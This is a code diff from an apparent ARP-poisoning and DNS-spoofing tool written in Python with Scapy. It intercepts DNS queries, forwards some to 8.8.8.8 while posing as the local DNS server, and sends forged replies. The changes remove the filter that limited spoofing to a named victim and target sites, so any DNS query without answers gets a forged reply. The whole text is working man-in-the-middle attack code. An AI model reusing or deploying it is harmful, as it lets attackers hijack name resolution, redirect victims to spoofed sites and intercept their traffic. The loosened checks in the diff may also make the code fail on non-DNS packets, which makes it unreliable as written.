@@ -458,18 +458,18 @@ class ARPP(object):
         # this function is called on each packet in the sniff call further ahead
         def packet_callback(loc_dns_server):
             def forward_dns(pkt):
-                if DNS in pkt and DNSQR in pkt:
-                    print("Forwarding: {}".format(pkt[DNSQR].qname))
-                    response = sr1(
-                        IP(dst='8.8.8.8')/
-                            UDP(sport=pkt[UDP].sport)/
-                            DNS(rd=1, id=pkt[DNS].id, qd=DNSQR(qname=pkt[DNSQR].qname)),
-                        verbose=0,
-                    )
-                    resp_pkt = IP(dst=pkt[IP].src, src=loc_dns_server)/UDP(dport=pkt[UDP].sport)/DNS()
-                    resp_pkt[DNS] = response[DNS]
-                    send(resp_pkt, verbose=0)
-                    return "Responding to {}".format(pkt[IP].src)
+                # if DNS in pkt and DNSQR in pkt and UDP in pkt:
+                print("Forwarding: {}".format(pkt[DNSQR].qname))
+                response = sr1(
+                    IP(dst='8.8.8.8')/
+                        UDP(sport=pkt[UDP].sport)/
+                        DNS(rd=1, id=pkt[DNS].id, qd=DNSQR(qname=pkt[DNSQR].qname)),
+                    verbose=0,
+                )
+                resp_pkt = IP(dst=pkt[IP].src, src=loc_dns_server)/UDP(dport=pkt[UDP].sport)/DNS()
+                resp_pkt[DNS] = response[DNS]
+                send(resp_pkt, verbose=0)
+                return "Responding to {}".format(pkt[IP].src)
             # this is just for debugging purposes on the linux machine
             # if DNS in packet and DNSQR in packet and IP in packet and packet[IP].src == ipVictim:
             #     print("DNS in packet: {}".format(DNS in packet)) 
@@ -477,13 +477,16 @@ class ARPP(object):
             #     print("Packet operation code is 0: {}".format(packet[DNS].opcode==0))
             def send_spoofed_response(packet):
                 # first we check if the packet is one that needs to be spoofed
-                if  (DNS in packet)\
-                        and (IP in packet)\
-                        and (packet[IP].src == ipVictim)\
-                        and (packet[DNS].opcode==0)\
-                        and (UDP in packet)\
-                        and (DNSQR in packet)\
-                        and ( any([target_site in packet[DNSQR].qname.decode("utf-8") for target_site in target_sites.keys()]) ):
+                # if  (DNS in packet)\
+                #         and (IP in packet)\
+                #         and (packet[IP].src == ipVictim)\
+                #         and (packet[DNS].opcode==0)\
+                #         and (UDP in packet)\
+                #         and (DNSQR in packet)\
+                #         and ( any([target_site in packet[DNSQR].qname.decode("utf-8") for target_site in target_sites.keys()]) ):
+                if (DNS in packet\
+                    and packet[DNS].opcode == 0\
+                    and packet[DNS].ancount == 0):
                     # the previous if-statement checks if it's a DNS request and it's coming from the victim and it's a QUERY (i.e. opcode=0), if so then send fake reply
                     print("[+] Caught DNS request from {} for {}".format(packet[IP].src, packet[DNSQR].qname.decode("utf-8")))
                     
